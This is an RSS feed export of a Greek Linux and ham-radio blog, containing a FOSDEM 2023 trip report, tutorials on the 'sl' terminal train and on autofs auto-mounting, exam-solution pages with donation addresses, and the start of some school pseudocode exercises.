&lt;img src="upload://fgiizC8mLv0Zuvv5OsQEN0JZA8B.jpeg" alt="Screenshot_20230208-231833_Gallery|653x500, 100%">
&lt;img src="upload://gW5AIb7tWYqiagVThU0xrV8ZQD5.jpeg" alt="Screenshot_20230208-231839_Gallery|533x500, 75%">&lt;/p>
&lt;p>Έπειτα, αφού παρακολουθήσαμε κάποιες ομιλίες που θέλαμε σε εκείνο το κτήριο, επισκεπτήκαμε το κτήριο H, οπού εκεί βρισκόντουσαν και τα περισσότερα stands εταιρειών.
&lt;img src="upload://m7QsqbOSHyXj3CV4K5UKsaK6AmA.jpeg" alt="Screenshot_20230208-231750_Gallery|456x500">&lt;/p>
&lt;p>Σε αυτό το Room, την παράσταση έκλεβε το stand του VLC, στο οποίο άνθρωποι ντυμένοι ως κώνοι, οδηγούσαν το κοινό να παίξουν στον τροχό τους..οπού το μεγάλο έπαθλο δεν ήταν άλλο, από το να γίνουν και οι ίδιοι κόνοι! Ο φίλος μας ο &lt;a href="https://screwdycrow.artstation.com/">Δημήτρης Τζιλιβάκης&lt;/a> (φοβερός Linuxας illustrator με krita), κέρδισε κι εκείνος τον δικό του VLC κώνο.
&lt;img src="upload://mJjLkMpordOARonR6V33vBWcaCt.jpeg" alt="Screenshot_20230208-231756_Gallery|378x500">&lt;/p>
&lt;p>&lt;img src="upload://3vYRsqpBXTD2FpUeWne1ReNSHc8.jpeg" alt="photo_2023-02-04_20-43-21|666x500">
&lt;code>@kgiannakis, Δημήτρης Τζιλιβάκης, Δημήτρης Βαγιακάκος (εγώ - ο σκούφος λυγίζει από το βάρος των αυτοκολλήτων που βρίσκονται μέσα σε αυτόν!)&lt;/code>&lt;/p>
&lt;p>Στο ίδιο κτήριο βρισκόντουσαν και άλλα διάσημα stands όπως αυτό του LibreOffice, CryptPad, DAVx5 και αρκετά άλλα (εδώ μπορείτε να δείτε όλα τα stands οπού παρευρέθηκαν στην FOSDEM2023).
&lt;img src="upload://7U7xskmDg1ZWgwYqUYqmfQsn1fZ.jpeg" alt="signal-2023-02-08-14-11-06-026|375x500, 75%">&lt;/p>
&lt;p>Άλλο ένα stand που δεν μπορεί να μν αναφερθεί, είναι το Linux on Mobile, με διάφορες φορητές συσκευές να τρέχουν Mobian καθώς και άλλα Mobile Linux λειτουργικά με GNOME και KDE. (Μόνο το degoogled foss Android έλειπε)
&lt;img src="upload://kn3B0ELEKAoHnx91RBGM0nRW0EJ.jpeg" alt="Screenshot_20230208-231730_Gallery|372x500">&lt;/p>
&lt;p>Επιπλέον, πολλά από τα stands εκεί ήταν από διάφορες Ασιατικές χώρες.
Συμμετοχές από Σιγκαπούρη, αλλά και ΤαΪβάν με ένα foss επιτραπέζιο ήταν μερικές από τις ενδιαφέρουσες προσθήκες.
&lt;img src="upload://7gfp4PYYoqw7z2H0RdUCJN8Lk2g.jpeg" alt="Screenshot_20230208-231713_Gallery|380x500">&lt;/p>
&lt;p>Φυσικά, πρέπει να αναφερθεί και το παραμύθι της FSFE σχετικά με την έννοια του ανοικτού λογισμικού και της ελευθερίας παραμετροποίησης.
&lt;img src="upload://knDqd0P08Nzz0NXUELCLqkE6Y6X.jpeg" alt="Screenshot_20230208-231621_Gallery|399x500, 50%">&lt;/p>
&lt;h3 id="bonus-ham-radio-experience">BONUS Ham Radio experience&lt;/h3>
&lt;p>Εκτός από το ανοικτό λογισμικό, κατά την διάρκεια της επίσκεψης μας στις Βρυξέλλες, ως ραδιοερασιτέχνης &lt;a href="https://www.qrz.com/db/sv1sjp">(SV1SJP)&lt;/a>, κοινοποίησα την τοποθεσία μου μέσω APRS έχοντας ως σχόλιο &amp;ldquo;FOSDEM 2023&amp;rdquo;.
&lt;img src="upload://qnT6IcagayITm9p1dFFnoLP8cDC.jpeg" alt="Screenshot_20230208-234118_Gallery|539x500, 50%">&lt;/p>
&lt;p>Μετά από λίγες ώρες λοιπόν, έλαβα αυτό το email στο inbox μου:
&lt;img src="upload://bVl16kkAqfYiVoNj5wORkWqIHEA.png" alt="Screenshot_20230208-234046|680x500, 50%">&lt;/p>
&lt;p>Και έτσι βρεθήκαμε και με την ομάδα Ραδιοερασιτεχνών του Βελγίου.
&lt;img src="upload://A6DC1tFBsfJLMyUK4BDdLXijJKQ.jpeg" alt="Screenshot_20230208-231548_Gallery|220x500">&lt;/p>
&lt;p>Για την λιγούρα από το πολύ ανοικτό λογισμικό, στο camp του Πανεπιστημίου υπήρχαν αρκετές καντίνες με burgers, hot dogs, βέλγικες πατάτες και βάφλες για να ταϊσουν τους χιλιάδες επισκέπτες της φετινής FOSDEM.&lt;/p>
&lt;p>&lt;img src="upload://nNrXdxfdc6KhkFY8RcVn5kWcbbo.jpeg" alt="signal-2023-02-08-14-11-06-026-3|375x500">&lt;/p>
&lt;p>Μετά το συνέδριο, υπήρξαν και πάρτυ,,, ωστόσο η εξάντληση μας δεν μας επέτρεψε να παρευρεθούμε. (Παραμένει στην λίστα TODO για επόμενη επίσκεψη).&lt;/p>
&lt;h3 id="fosdem-android-application">FOSDEM Android Application&lt;/h3>
&lt;p>Στα οργανωτικά του συνεδρίου, η FOSDEM διατέθει Android εφαρμογή οπού μπορούσε να μας βοηθήσει να οργανώσουμε τις εκατοντάδες ομιλίες οπού μας ενδιέφεραν να παρακολουθήσουμε (είτε φυσικά είτε remote), καθώς και διατείθε και χάρτη για τους χώρους του Πανεπιστημίου, κάτι επίσης εξαιρετικά σημαντικό!
&lt;img src="upload://awa22yNz37hzUZf8NiyfohjbzOG.png" alt="Screenshot_20230208-234359_FOSDEM Companion|543x500, 75%">&lt;/p>
&lt;p>Μέσα από το συνέδριο, γνωρίσαμε αρκετούς ανθρώπους από όλο τον κόσμο που ενδιαφέρονται για το ανοικτό λογισμικό, ακούσαμε διαφορετικές απόψεις αλλά και επεκτείναμε τα social network μας σε όλες τις πλευρές της γης. Από Σουηδία μέχρι Κολομβία, από Μαλαισία μέχρι Ρουμανία.&lt;/p>
&lt;p>&lt;img src="upload://5WgmJSaGEk2q4m6PHOTCjnMzDuO.jpeg" alt="IMG_20230205_192731_363|375x500, 100%">
Φωτογραφία μεταξύ Ελλήνων,Σουηδών και Κολομβιανών - Ο &lt;a href="https://www.linkedin.com/in/mongrelion/">Carlos Leon&lt;/a> μαζί με @kgiannakis, Δημήτρης Τζιλιβάκης και εγώ.&lt;/p>
&lt;h3 id="επίλογος">Επίλογος&lt;/h3>
&lt;p>Ευχαριστούμε όλους αυτούς τους ανθρώπους που μας υπενθύμισαν σε αυτό το γεμάτο 2ήμερο ότι η κοινότητα ανοικτού λογισμικού είναι τεράστια και βρίσκεται σε όλα τα μήκη του πλανήτη. Ανεξαρτήτου έθνους, χώρας, χρώματος, διανομής Linux, η αγάπη μας για την πρόοδο και την ανάπτυξη της ανθρωπότητας μέσω νέων τεχνολογιών, παραμένει ίδια!!!&lt;/p>
&lt;h2 id="ακολουθούν-περισσότερες-φωτογραφίες-από-fosdem">Ακολουθούν περισσότερες φωτογραφίες από FOSDEM&lt;/h2>
&lt;p>&lt;img src="upload://vaVEQVC1IcROIs1odn2SbwpFdjL.jpeg" alt="signal-2023-02-08-14-11-06-026-4|666x500">&lt;/p>
&lt;p>&lt;img src="upload://ibd3WBTJw1paHmsnUv2zAvYN2JC.jpeg" alt="signal-2023-02-08-14-11-06-026-5|666x500">
&lt;img src="upload://3LYJCT6PG5eMvkCjmkrD1uKfNa8.jpeg" alt="signal-2023-02-08-14-11-06-026-7|666x500">
&lt;img src="upload://tBYnMGq3O6Uv1YEVmVfxKIH5m1m.jpeg" alt="Screenshot_20230208-231638_Gallery|382x500">
&lt;img src="upload://9Fg5mxOzAScQvPnPAsmV2sakHDw.jpeg" alt="Screenshot_20230208-235404_Gallery|377x500">
&lt;img src="upload://f5aeS23feHasqECWZHd8j51PxiD.jpeg" alt="Screenshot_20230208-235411_Gallery|385x500">&lt;/p>
&lt;p>&lt;img src="upload://AdBbfGlOfVUKlbRYJP73vWDmPRc.jpeg" alt="signal-2023-02-08-14-11-06-026-2|375x500">
&lt;img src="upload://cj1dwFIKsehau0dE2OTv2Tv5UU4.jpeg" alt="Screenshot from 2023-02-09 00-10-35|389x500">&lt;/p></content></item><item><title>Τραινάκι στο Τερματικό του Linux</title><link>/greek_articles/sl/</link><pubDate>Mon, 12 Dec 2022 00:00:00 +0000</pubDate><guid>/greek_articles/sl/</guid><description>Σημαντική Ανακοίνωση: Το παρών άρθρο έχει δημοσιτευτεί επίσημα στο Linux-User.gr και διατηρείται εδώ για καθαρά λόγους αρχειοθέτησης. Αφού είδαμε το iSemedaki για το GNOME, ήρθε η ώρα να μάθουμε πώς να εμφανίσουμε ένα μαγικό τραινάκι στο τερματικό του Linux.
Η εντολή ls αποτελεί μία εντολή οπού εμφανίζει τα αρχεία &amp;amp; φακέλους όπου εμπεριέχονται σε έναν φάκελο. (Μάθημα στο Ultimate Linux Terminal Tutorial σχετικά με αυτά).
Το sl από την άλλη, αποτελεί την εντολή &amp;ldquo;τιμωρία&amp;rdquo; σε περίπτωση που ο χρήστης πληκτρολογήσει ανάποδα το ls.</description><content>&lt;p>&lt;a href="https://linux-user.gr/t/trainaki-sto-termatiko-toy-linux/4658">Σημαντική Ανακοίνωση: Το παρών άρθρο έχει δημοσιτευτεί επίσημα στο Linux-User.gr και διατηρείται εδώ για καθαρά λόγους αρχειοθέτησης.&lt;/a>
Αφού είδαμε το &lt;a href="https://linux-user.gr/t/isemedaki-h-epektash-gnome-poy-den-prepei-na-leipei-apo-kanena-ellhniko-spiti/3590">iSemedaki&lt;/a> για το GNOME, ήρθε η ώρα να μάθουμε πώς να εμφανίσουμε ένα μαγικό τραινάκι στο τερματικό του Linux.&lt;/p>
&lt;p>&lt;img src="upload://2kkTXf8gO5WtEZZnbZldEIxE8Kd.jpeg" alt="image|690x465">&lt;/p>
&lt;p>Η εντολή ls αποτελεί μία εντολή οπού εμφανίζει τα αρχεία &amp;amp; φακέλους όπου εμπεριέχονται σε έναν φάκελο. &lt;a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzfu1kLBWBbj-3wdKSzDVl4">(Μάθημα στο Ultimate Linux Terminal Tutorial σχετικά με αυτά)&lt;/a>.&lt;/p>
&lt;p>Το sl από την άλλη, αποτελεί την εντολή &amp;ldquo;τιμωρία&amp;rdquo; σε περίπτωση που ο χρήστης πληκτρολογήσει ανάποδα το ls.&lt;/p>
&lt;p>Για τιμωρία, το sl θα εμφανίσει ένα τραινάκι να τρέχει εντός του τερματικού μας.&lt;/p>
&lt;p>Εκτός βέβαια από το παραδοσιακό τραινάκι, χρησιμοποιώντας παραμέτρους θα δούμε και διαφορετικά κόλπα με το τραινάκι:&lt;/p>
&lt;pre tabindex="0">&lt;code>sl -a : Accident mode με ανθρώπους να ζητούν βοήθεια
sl -l : Εμφανίζει ένα μικρότερο τραίνο
sl -F : Το τραίνο αρχίζει και πετάει
&lt;/code>&lt;/pre>&lt;p>Για να κάνουμε εγκατάσταση το sl, δίνουμε από γραμμή εντολών:&lt;/p>
&lt;p>Για Debian Based (Ubuntu,Linux Mint):&lt;/p>
&lt;pre tabindex="0">&lt;code>sudo apt install sl
&lt;/code>&lt;/pre>&lt;p>Για Fedora:&lt;/p>
&lt;pre tabindex="0">&lt;code>sudo dnf install sl
&lt;/code>&lt;/pre>&lt;p>Για Android Termux:&lt;/p>
&lt;pre tabindex="0">&lt;code>pkg install sl
&lt;/code>&lt;/pre>&lt;p>Ενδεικτικό short Video:
&lt;a href="https://youtube.com/shorts/jbbRa-lYQoc?feature=share">https://youtube.com/shorts/jbbRa-lYQoc?feature=share&lt;/a>&lt;/p></content></item><item><title>Κάντε Auto-mount συσκευές κατά την εκκίνηση του συστήματος χωρίς αλλαγές στο /etc/fstab</title><link>/greek_articles/fstab/</link><pubDate>Mon, 10 Oct 2022 00:00:00 +0000</pubDate><guid>/greek_articles/fstab/</guid><description>Σημαντική Ανακοίνωση: Το παρών άρθρο έχει δημοσιτευτεί επίσημα στο Linux-User.gr και διατηρείται εδώ για καθαρά λόγους αρχειοθέτησης.
Η Ιστορία: Ένα από τα προβλήματα που εντόπισα όταν αποφάσισα να προσθέσω εξωτερικό δίσκο στο Raspberry Pi 4 server μου, ήταν ότι για να πραγματοποιηθεί αυτόματα το mount κατά το boot, έπρεπε να κάνω κάποιες αλλαγές στο /etc/fstab . To πρόβλημα που υπήρχε με αυτή την λύση ήταν η Ρώσικη ρουλέτα.
Το πρόβλημα: Οποιοδήποτε συντακτικό/λογικό λάθος πάνω στην αλλαγή, κατέληγες σε grub rescue που έπρεπε να μπει ποντίκι-πληκτρολόγιο για να πραγματοποιηθούν αλλαγές, είτε να αφαιρεθεί η sd από το Raspberry Pi, να συνδεθεί σε άλλο σύστημα και να αναιρεθεί η αλλαγή.</description><content>&lt;p>&lt;a href="https://linux-user.gr/t/kante-auto-mount-syskeyes-kata-thn-ekkinhsh-toy-systhmatos-chwris-allages-sto-etc-fstab/4602">Σημαντική Ανακοίνωση: Το παρών άρθρο έχει δημοσιτευτεί επίσημα στο Linux-User.gr και διατηρείται εδώ για καθαρά λόγους αρχειοθέτησης.&lt;/a>&lt;/p>
&lt;h2 id="η-ιστορία">Η Ιστορία:&lt;/h2>
&lt;p>Ένα από τα προβλήματα που εντόπισα όταν αποφάσισα να προσθέσω εξωτερικό δίσκο στο Raspberry Pi 4 server μου, ήταν ότι για να πραγματοποιηθεί αυτόματα το mount κατά το boot, έπρεπε να κάνω κάποιες αλλαγές στο &lt;a href="https://linux-user.gr/t/auto-mount-devices-kata-thn-ekkinhsh-toy-systhmatos-video-guide/3193">/etc/fstab&lt;/a> . To πρόβλημα που υπήρχε με αυτή την λύση ήταν η Ρώσικη ρουλέτα.&lt;/p>
&lt;h3 id="το-πρόβλημα">Το πρόβλημα:&lt;/h3>
&lt;p>Οποιοδήποτε συντακτικό/λογικό λάθος πάνω στην αλλαγή, κατέληγες σε grub rescue που έπρεπε να μπει ποντίκι-πληκτρολόγιο για να πραγματοποιηθούν αλλαγές, είτε να αφαιρεθεί η sd από το Raspberry Pi, να συνδεθεί σε άλλο σύστημα και να αναιρεθεί η αλλαγή.
Επιπλέον, υπήρχε και το πρόβλημα του αν για οποιοδήποτε λόγο δεν ήταν συνδεδεμένη η συσκευή κατά το boot, πάλι κατέληγε σε grub rescue.. Και αν εκείνη την ώρα απουσίαζες από το σπίτι και έκανες αλλαγές μέσω ssh και VPN.. και κάποιος από λάθος αφαίρεσε/κούνησε το καλώδιο&amp;hellip;.. RIP&lt;/p>
&lt;p>Συνεπώς, έπρεπε να βρω μία διαφορετική προσέγγιση για να επιλύσω το πρόβλημα μου με το automount. Εκεί έρχεται η λύση που προσφέρει το Auto-Fs.&lt;/p>
&lt;h3 id="η-λύση-στο-πρόβλημα">Η λύση στο πρόβλημα:&lt;/h3>
&lt;p>Το autofs πρόκειται για ένα πρόγραμμα για την αυτόματη προσάρτηση συσκευών ανάλογα με τις ανάγκες του χρήστη σε πραγματικό χρόνο. Οι αυτόματες προσαρτήσεις γίνονται mount μόνο κατά την προσπέλαση και un-mount μετά από μια περίοδο αδράνειας. Εξαιτίας αυτού, η αυτόματη προσάρτηση κοινών αρχείων NFS/Samba εξοικονομεί bandwith και τελικά προσφέρει καλύτερες συνολικές επιδόσεις σε σύγκριση με τις στατικές προσαρτήσεις μέσω της fstab.&lt;/p>
&lt;p>Παραδοσιακά για εγκατάσταση του autofs σε Debian based συστήματα δίνουμε:&lt;/p>
&lt;pre tabindex="0">&lt;code>sudo apt install autofs
&lt;/code>&lt;/pre>&lt;p>Για τα Fed-ωραία και τα υπόλοιπα distros ( i use arch btw), μπορείτε να δώσετε τις αντίστοιχες εντολές εγκατάστασης βάση του package manager &amp;amp;&amp;amp; repository που χρησιμοποιεί η δικιά σας διανομή Linux. DuckDuckGo it λοιπόν!&lt;/p>
&lt;h2 id="ρύθμιση-του-autofs">Ρύθμιση του autofs&lt;/h2>
&lt;p>Για να λειτουργήσει ομαλά το mount με το AutoFs, πρέπει να κάνουμε αλλαγές σε 2 αρχεία:&lt;/p>
&lt;ul>
&lt;li>Στο auto.master έτσι ώστε να το οδηγήσουμε στο directory που θέλουμε να κάνει αυτόματα mount,&lt;/li>
&lt;li>Στο auto.usb οπού θα εξηγεί στο autofs τα τι που πώς, σχετικά με την συσκευή που θέλουμε να κάνουμε mount.&lt;/li>
&lt;/ul>
&lt;h3 id="επεξεργασία-automaster">Επεξεργασία auto.master&lt;/h3>
&lt;p>Ανοίγουμε έναν test editor για να το επεξεργαστούμε (εγώ δουλεύω με nano):&lt;/p>
&lt;pre tabindex="0">&lt;code>sudo nano /etc/auto.master
&lt;/code>&lt;/pre>&lt;p>και έπειτα προσθέτουμε το εξής:&lt;/p>
&lt;pre tabindex="0">&lt;code>/media /etc/auto.usb --timeout=60 --ghost
&lt;/code>&lt;/pre>&lt;p>Kαι τώρα μπορούμε να δημιουργήσουμε το auto.usb αρχείο. Συνεχίζουμε από τερματικό:&lt;/p>
&lt;pre tabindex="0">&lt;code>sudo nano /etc/auto.usb
&lt;/code>&lt;/pre>&lt;p>Και προσθέτουμε την παρακάτω γραμμή:&lt;/p>
&lt;pre tabindex="0">&lt;code>myUSB -fstype=auto,uid=pi,gid=pi,rw UUID=YOUR_UUID
&lt;/code>&lt;/pre>&lt;p>Οπού:&lt;/p>
&lt;ul>
&lt;li>myUSB : Το όνομα του φακέλου που θα εμφανιστεί εντός /media. Στο παράδειγμα π.χ. θα εμφανιστεί ως &lt;code>/media/myUSB&lt;/code>,&lt;/li>
&lt;li>Το -fstype ορίζουμε τον τύπο του filesystem οπού είναι η συσκευή οπού θα κάνουμε mount.&lt;/li>
&lt;li>uid του χρήστη μας,&lt;/li>
&lt;li>gid της ομάδας που συμμετέχει ο χρήστης μας,&lt;/li>
&lt;li>rw οπού δίνουμε read write δικαιώματα,&lt;/li>
&lt;li>το UUID της συσκευής.&lt;/li>
&lt;/ul>
&lt;p>Για να βρούμε το UUID της συσκευής μας, δίνουμε:&lt;/p>
&lt;pre tabindex="0">&lt;code>sudo lsblk -f | grep -v loop
&lt;/code>&lt;/pre>&lt;p>Φυσικά αποθηκεύουμε τις αλλαγές και έπειτα κάνουμε και μία επανεκκίνηση στο systemd service:&lt;/p>
&lt;pre tabindex="0">&lt;code>sudo systemctl restart autofs.service
&lt;/code>&lt;/pre>&lt;p>Και είμαστε έτοιμοι!!!&lt;/p>
&lt;h3 id="unmount">Unmount&lt;/h3>
&lt;p>Φυσικά, αν για οποιοδήποτε λόγο θέλουμε να αφαιρέσουμε την συσκευή ενώ έχουμε τo PC/RaspberryPi/Server ανοικτό, απλά δίνουμε:&lt;/p>
&lt;pre tabindex="0">&lt;code>sudo umount /media/myUSB
&lt;/code>&lt;/pre>&lt;p>Και όταν τον συνδέσουμε ξανά, το autofs θα τον ξανακάνει mount αυτόματα. :)&lt;/p></content></item><item><title>./welcome.sh</title><link>/posts/hello/</link><pubDate>Fri, 11 Mar 2022 00:00:00 +0000</pubDate><guid>/posts/hello/</guid><description>Hello stranger, My name is DimitrisV SV1SJP, I am from Greece,EU and this is my small website. On this website I will organise all the educational stuff I have created in both Greek and English. This is the very first release so expect bugs and glitches.
Wishing you the best,
Dimitris Vagiakakos dimitrislinuxos@protonmail.ch</description><content>&lt;p>Hello stranger,
My name is DimitrisV SV1SJP, I am from Greece,EU and this is my small website. On this website I will organise all the educational stuff I have created in both Greek and English.
This is the very first release so expect bugs and glitches.&lt;/p>
&lt;p>Wishing you the best,&lt;/p>
&lt;p>Dimitris Vagiakakos
&lt;a href="mailto:dimitrislinuxos@protonmail.ch">dimitrislinuxos@protonmail.ch&lt;/a>&lt;/p></content></item><item><title>Θέματα A+B Part2</title><link>/lyseis_aepp/content/posts/ask_a+b_2/</link><pubDate>Fri, 11 Mar 2022 00:00:00 +0000</pubDate><guid>/lyseis_aepp/content/posts/ask_a+b_2/</guid><description>Λύσεις Θεμάτων Α+Β Part 2 - για να δείτε τις λύσεις κάντε κλίκ εδώ: Υποστηρίξτε το Project για να συνεχίσουμε να παράγουμε εκπαιδευτικό υλικό. Προσοχή: Από τις 28 Δεκεμβρίου το Project Panellinies_AEPP απενεργοποιεί όλες τις διαφημίσεις πάνω στο εκπαιδευτικό υλικό. Τo Project πλέον λειτουργεί και υποστηρίζεται αποκλειστικά από τις χορηγίες σας σε Basic Attention Token (BAT) μέσω του Brave Browser στο κανάλι στο Youtube καθώς και σε άλλα κρυπτονομίσματα στις παρακάτω διευθύνσεις:</description><content>&lt;h1 id="λύσεις-θεμάτων-αβ-part-2---για-να-δείτε-τις-λύσεις-κάντε-κλίκ-εδώ-pdfslyseispanellinies_aepp_ab_2_lyseispdf">&lt;a href="/PDFs/lyseis/panellinies_aepp_a+b_2_lyseis.pdf">Λύσεις Θεμάτων Α+Β Part 2 - για να δείτε τις λύσεις κάντε κλίκ εδώ: &lt;/a>&lt;/h1>
&lt;hr>
&lt;h2 id="υποστηρίξτε-το-project-για-να-συνεχίσουμε-να-παράγουμε-εκπαιδευτικό-υλικό">Υποστηρίξτε το Project για να συνεχίσουμε να παράγουμε εκπαιδευτικό υλικό.&lt;/h2>
&lt;p>Προσοχή: Από τις 28 Δεκεμβρίου το Project Panellinies_AEPP απενεργοποιεί όλες τις διαφημίσεις πάνω στο εκπαιδευτικό υλικό.
Τo Project πλέον λειτουργεί και υποστηρίζεται αποκλειστικά από τις χορηγίες σας σε Basic Attention Token (BAT) μέσω του Brave Browser &lt;a href="https://www.youtube.com/LinuxOSblog/">στο κανάλι στο Youtube&lt;/a> καθώς και σε άλλα κρυπτονομίσματα στις παρακάτω διευθύνσεις:&lt;/p>
&lt;p>Bitcoin: bc1q6j959m3whh44ztr8k6p7545n5pzcsncple7qmy&lt;/p>
&lt;p>Ethereum: 0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873&lt;/p>
&lt;p>Cardano: addr1qxewtm0y5yk2mgf93ct4ghguus2shu34fu786t62j3tv7296evenhmr0ltmx3hdyw4d6d8gj8qspry5pe3raaw4nu8as7jsr9l&lt;/p>
&lt;p>Monero: 46ewn3rgXMSceuEUEng1bze1RzG61rEiFV3hJ6VKuzvHU62jPntydJRBcFinQ62Pad8AvdoX9YbQcY5HKX3Cr3UQPkhiQ4L&lt;/p>
&lt;p>VeChain: 0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873&lt;/p>
&lt;p>Shiba: 0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873&lt;/p>
&lt;p>AIOZ: 0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873&lt;/p>
&lt;p>Για το πώς θα κερδίσετε δωρεάν BAT, διαβάστε αυτό το άρθρο κάνοντας κλικ &lt;a href="https://cerebrux.net/2021/02/25/brave-bat-token/">εδώ&lt;/a>&lt;/p>
&lt;p>&lt;img src="/img/brave.png" alt="">&lt;/p></content></item><item><title>Θέματα A+B Part1</title><link>/lyseis_aepp/content/posts/ask_a+b_1/</link><pubDate>Thu, 10 Mar 2022 00:00:00 +0000</pubDate><guid>/lyseis_aepp/content/posts/ask_a+b_1/</guid><description>Λύσεις Θεμάτων Α+Β Part 1 - για να δείτε τις λύσεις κάντε κλίκ εδώ: Υποστηρίξτε το Project για να συνεχίσουμε να παράγουμε εκπαιδευτικό υλικό. Προσοχή: Από τις 28 Δεκεμβρίου το Project Panellinies_AEPP απενεργοποιεί όλες τις διαφημίσεις πάνω στο εκπαιδευτικό υλικό. Τo Project πλέον λειτουργεί και υποστηρίζεται αποκλειστικά από τις χορηγίες σας σε Basic Attention Token (BAT) μέσω του Brave Browser στο κανάλι στο Youtube καθώς και σε άλλα κρυπτονομίσματα στις παρακάτω διευθύνσεις:</description><content>&lt;h1 id="λύσεις-θεμάτων-αβ-part-1---για-να-δείτε-τις-λύσεις-κάντε-κλίκ-εδώ-pdfslyseispanellinies_aepp_ab_1_lyseispdf">&lt;a href="/PDFs/lyseis/panellinies_aepp_a+b_1_lyseis.pdf">Λύσεις Θεμάτων Α+Β Part 1 - για να δείτε τις λύσεις κάντε κλίκ εδώ: &lt;/a>&lt;/h1>
&lt;hr>
&lt;h2 id="υποστηρίξτε-το-project-για-να-συνεχίσουμε-να-παράγουμε-εκπαιδευτικό-υλικό">Υποστηρίξτε το Project για να συνεχίσουμε να παράγουμε εκπαιδευτικό υλικό.&lt;/h2>
&lt;p>Προσοχή: Από τις 28 Δεκεμβρίου το Project Panellinies_AEPP απενεργοποιεί όλες τις διαφημίσεις πάνω στο εκπαιδευτικό υλικό.
Τo Project πλέον λειτουργεί και υποστηρίζεται αποκλειστικά από τις χορηγίες σας σε Basic Attention Token (BAT) μέσω του Brave Browser &lt;a href="www.youtube.com/LinuxOSblog">στο κανάλι στο Youtube&lt;/a> καθώς και σε άλλα κρυπτονομίσματα στις παρακάτω διευθύνσεις:&lt;/p>
&lt;p>Bitcoin: bc1q6j959m3whh44ztr8k6p7545n5pzcsncple7qmy&lt;/p>
&lt;p>Ethereum: 0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873&lt;/p>
&lt;p>Cardano: addr1qxewtm0y5yk2mgf93ct4ghguus2shu34fu786t62j3tv7296evenhmr0ltmx3hdyw4d6d8gj8qspry5pe3raaw4nu8as7jsr9l&lt;/p>
&lt;p>Monero: 46ewn3rgXMSceuEUEng1bze1RzG61rEiFV3hJ6VKuzvHU62jPntydJRBcFinQ62Pad8AvdoX9YbQcY5HKX3Cr3UQPkhiQ4L&lt;/p>
&lt;p>VeChain: 0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873&lt;/p>
&lt;p>Shiba: 0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873&lt;/p>
&lt;p>AIOZ: 0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873&lt;/p>
&lt;p>Για το πώς θα κερδίσετε δωρεάν BAT, διαβάστε αυτό το άρθρο κάνοντας κλικ &lt;a href="https://cerebrux.net/2021/02/25/brave-bat-token/">εδώ&lt;/a>&lt;/p>
&lt;p>&lt;img src="/img/brave.png" alt="">&lt;/p></content></item><item><title>Θέματα Γ+Δ Part3</title><link>/lyseis_aepp/content/posts/ask_g+d_3/</link><pubDate>Wed, 09 Mar 2022 00:00:00 +0000</pubDate><guid>/lyseis_aepp/content/posts/ask_g+d_3/</guid><description>Θέματα Γ+Δ : Part 3: !Άσκηση1 ΣΥΝΑΡΤΗΣΗ Εις_το_Τετράγωνο(Χ): ΠΡΑΓΜΑΤΙΚΗ ΜΕΤΑΒΛΗΤΕΣ ΠΡΑΓΜΑΤΙΚΕΣ:Χ ΑΡΧΗ Εις_το_Τετράγωνο = Χ ^ 2 ΤΕΛΟΣ_ΣΥΝΑΡΤΗΣΗΣ ΠΡΟΓΡΑΜΜΑ ΑΣΚΗΣΗ02 ΜΕΤΑΒΛΗΤΕΣ: ΑΚΕΡΑΙΕΣ: ΠΡΑΓΜΑΤΙΚΕΣ: ΑΡΧΗ ΓΙΑ Υ ΑΠΌ 1 ΜΕΧΡΙ 10: ΓΙΑ Ι ΑΠΌ ΤΟ 1 ΜΕΧΡΙ 10: ΔΙΑΒΑΣΕ ΒΑΘΜΟ[Ι] ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ ΜΟ[Ι]=ΥΠΟΛΟΓΙΣΕ_Μ_Ο[ΒΑΘΜΟ[Ι]] ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ ΣΥΝΑΡΤΗΣΗ ΥΠΟΛΟΓΙΣΕ_Μ_Ο(ΒΑΘΜΟΥΛΗΣ): ΠΡΑΓΜΑΤΙΚΗ ΜΕΤΑΒΛΗΤΕΣ: ΑΚΕΡΑΙΕΣ:Ι ΠΡΑΓΜΑΤΙΚΕΣ:Μ ΑΡΧΗ Μ=0 ΓΙΑ Ι ΑΠΌ 1 ΜΕΧΡΙ 10 Μ= Μ + ΒΑΘΜΟΥΛΗΣ[Ι] ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ ΥΠΟΛΟΓΙΣΕ_Μ_Ο = Μ/10 ΤΕΛΟΣ_ΣΥΝΑΡΤΗΣΗΣ ΣΥΝΑΡΤΗΣΗ ΑΣΚΗΣΗ03(Ποσό_σε_Bitcoin): ΠΡΑΓΜΑΤΙΚΗ ΣΤΑΘΕΡΕΣ: ΙΣΟΤΙΜΙΑ = 60000.</description><content>&lt;h1 id="θέματα-γδ--part-3">Θέματα Γ+Δ : Part 3:&lt;/h1>
&lt;pre tabindex="0">&lt;code>!Άσκηση1
ΣΥΝΑΡΤΗΣΗ Εις_το_Τετράγωνο(Χ): ΠΡΑΓΜΑΤΙΚΗ
ΜΕΤΑΒΛΗΤΕΣ
ΠΡΑΓΜΑΤΙΚΕΣ:Χ
ΑΡΧΗ
Εις_το_Τετράγωνο = Χ ^ 2
ΤΕΛΟΣ_ΣΥΝΑΡΤΗΣΗΣ
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚΗΣΗ02
ΜΕΤΑΒΛΗΤΕΣ:
ΑΚΕΡΑΙΕΣ:
ΠΡΑΓΜΑΤΙΚΕΣ:
ΑΡΧΗ
ΓΙΑ Υ ΑΠΌ 1 ΜΕΧΡΙ 10:
ΓΙΑ Ι ΑΠΌ ΤΟ 1 ΜΕΧΡΙ 10:
ΔΙΑΒΑΣΕ ΒΑΘΜΟ[Ι]
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΜΟ[Ι]=ΥΠΟΛΟΓΙΣΕ_Μ_Ο[ΒΑΘΜΟ[Ι]]
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
